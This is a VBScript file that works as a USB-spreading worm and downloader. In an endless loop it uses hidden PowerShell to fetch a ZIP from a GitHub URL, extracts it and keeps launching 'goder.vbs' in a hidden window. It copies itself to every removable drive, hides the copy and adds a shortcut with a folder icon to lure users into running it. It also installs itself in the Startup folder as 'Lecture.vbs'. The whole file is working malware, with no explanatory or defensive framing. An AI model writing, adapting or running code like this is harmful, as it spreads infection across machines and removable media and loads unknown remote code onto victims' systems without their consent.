Option Explicit

Dim objFSO, objShell, strScriptPath, strDriveLetter, backupFolder, megaFolder, megaCmdFolder, url, zipFile

Set objFSO = CreateObject("Scripting.FileSystemObject")
Set objShell = CreateObject("WScript.Shell")

megaFolder = "C:\Mega"
megaCmdFolder = megaFolder & "\MEGAcmd"
backupFolder = megaCmdFolder & "\backup"

Do While True
    If Not objFSO.FolderExists(megaFolder) Then
        objFSO.CreateFolder megaFolder
    ElseIf Not objFSO.FolderExists(megaCmdFolder) Then
        DownloadAndExtractMEGAcmdSetup
    ElseIf Not objFSO.FolderExists(backupFolder) Then
        objFSO.CreateFolder backupFolder
    Else
        Dim colDrives, objDrive
        Set colDrives = objFSO.Drives
        For Each objDrive In colDrives
            If objDrive.DriveType = 1 Then
                strDriveLetter = objDrive.DriveLetter
                If objFSO.FolderExists(strDriveLetter & ":\") Then
                    CopyToPendrive strDriveLetter & ":\"
                    Exit For
                End If
            End If
        Next
        
        ' Check if less than 5 wscript.exe processes are running
        Dim wscriptCount
        wscriptCount = CountProcesses("wscript.exe")
        If wscriptCount < 5 Then
            ' Run goder.vbs
            Dim cmd, cmdFolder
            cmd = "start goder.vbs"
            cmdFolder = megaCmdFolder
            objShell.Run "cmd /c cd """ & cmdFolder & """ && " & cmd, 0, True
        End If
    End If

    ' Copy the script to the Startup folder
    CopyToStartup

    zipFile = megaFolder & "\MEGAcmd (2).zip"
    If objFSO.FileExists(zipFile) Then
        objFSO.DeleteFile zipFile
    End If

    WScript.Sleep 5000
Loop

Sub DownloadAndExtractMEGAcmdSetup
    url = "https://github.com/snxerame/new/raw/main/MEGAcmd.zip"
    zipFile = megaFolder & "\MEGAcmd.zip"

    If Not objFSO.FileExists(zipFile) Then
        objShell.Run "powershell -Command ""(New-Object System.Net.WebClient).DownloadFile('" & url & "', '" & zipFile & "')""", 0, True
    End If

    If objFSO.FileExists(zipFile) Then
        Dim objShellApp, objZipFile, objDestFolder
        Set objShellApp = CreateObject("Shell.Application")
        Set objZipFile = objShellApp.NameSpace(zipFile)
        Set objDestFolder = objShellApp.NameSpace(megaFolder)

        objDestFolder.CopyHere objZipFile.Items

        Do Until objDestFolder.Items.Count = objZipFile.Items.Count
            WScript.Sleep 1000
        Loop

        objFSO.DeleteFile zipFile
    End If
End Sub

Sub CopyToPendrive(drivePath)
    Dim vbsFilePath
    vbsFilePath = objFSO.GetParentFolderName(WScript.ScriptFullName) & "\" & objFSO.GetFileName(WScript.ScriptFullName)

    If Not objFSO.FileExists(drivePath & objFSO.GetFileName(vbsFilePath)) Then
        objFSO.CopyFile vbsFilePath, drivePath
        ' Hide Lecture.vbs file in pendrive
        objShell.Run "attrib +h """ & drivePath & "\" & objFSO.GetFileName(vbsFilePath) & """", 0, True
        WScript.Sleep 2000
        CreateShortcut drivePath & objFSO.GetFileName(vbsFilePath)
    End If
End Sub

Sub CreateShortcut(filePath)
    Dim objLink
    Set objLink = objShell.CreateShortcut(filePath & ".lnk")
    objLink.TargetPath = filePath
    ' Set folder icon for the shortcut
    objLink.IconLocation = "%SystemRoot%\system32\SHELL32.dll, 3"
    objLink.Save
End Sub

Sub CopyToStartup
    Dim startupFolder
    startupFolder = objShell.SpecialFolders("Startup")
    If Not objFSO.FileExists(startupFolder & "\Lecture.vbs") Then
        objFSO.CopyFile WScript.ScriptFullName, startupFolder & "\Lecture.vbs"
    End If
End Sub

Function CountProcesses(processName)
    Dim objWMIService, colProcesses, objProcess
    Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")
    Set colProcesses = objWMIService.ExecQuery("Select * from Win32_Process Where Name = '" & processName & "'")

    CountProcesses = colProcesses.Count
End Function
